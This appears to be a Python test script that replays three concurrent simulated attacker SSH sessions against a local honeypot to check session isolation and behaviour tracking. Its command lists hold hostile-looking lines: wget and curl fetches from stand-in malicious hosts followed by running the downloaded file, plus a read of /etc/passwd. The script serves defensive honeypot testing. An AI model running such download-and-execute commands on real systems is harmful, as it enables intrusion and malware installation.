"""Multiple concurrent attacker sessions against the honeypot.
Demonstrates: session isolation, persona assignment, concurrent TTP tracking."""
import pexpect, threading, time

HOST, PORT = "127.0.0.1", "2222"

ATTACKERS = [
    {"user": "root",    "pass": "1234",  "cmds": [
        "id", "uname -a",
        "wget http://evil.example.com/bot -O /tmp/bot",
        "chmod +x /tmp/bot", "/tmp/bot",
    ]},
    {"user": "admin",    "pass": "admin", "cmds": [
        "whoami", "cat /etc/passwd", "sudo -l",
        "curl -s http://pastebin.com/raw/x -o /tmp/payload.sh",
        "bash /tmp/payload.sh",
    ]},
    {"user": "ubuntu",    "pass": "ubuntu", "cmds": [
        "id", "hostname", "ps aux",
        "wget http://malware.example.com/linpeas.sh -O /tmp/peas.sh",
        "bash /tmp/peas.sh",
    ]},
]

results: list[str] = []

def attack(a: dict, idx: int):
    child = pexpect.spawn(
        f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        f"-o LogLevel=ERROR -p {PORT} {a['user']}@{HOST}",
        timeout=30,
    )
    try:
        child.expect("assword:", timeout=10)
        child.sendline(a["pass"])
        child.expect("# ", timeout=10)
        out = [f"[Session {idx}] Connected as {a['user']}"]
        for cmd in a["cmds"]:
            child.sendline(cmd)
            child.expect("# ", timeout=30)
            resp = child.before.decode()
            # grab last non‑blank non‑echo line
            for line in resp.splitlines():
                stripped = line.strip()
                if stripped and stripped != cmd:
                    out.append(f"  $ {cmd}  ->  {stripped[:120]}")
                    break
        child.sendline("exit")
        child.expect(pexpect.EOF, timeout=5)
    except Exception as e:
        out.append(f"  ERROR: {e}")
    results.extend(out)

threads = []
for i, a in enumerate(ATTACKERS):
    t = threading.Thread(target=attack, args=(a, i))
    threads.append(t)
    t.start()
    time.sleep(0.5)

for t in threads:
    t.join()

for line in results:
    print(line)

print(f"\n=== {len(ATTACKERS)} concurrent sessions completed ===")
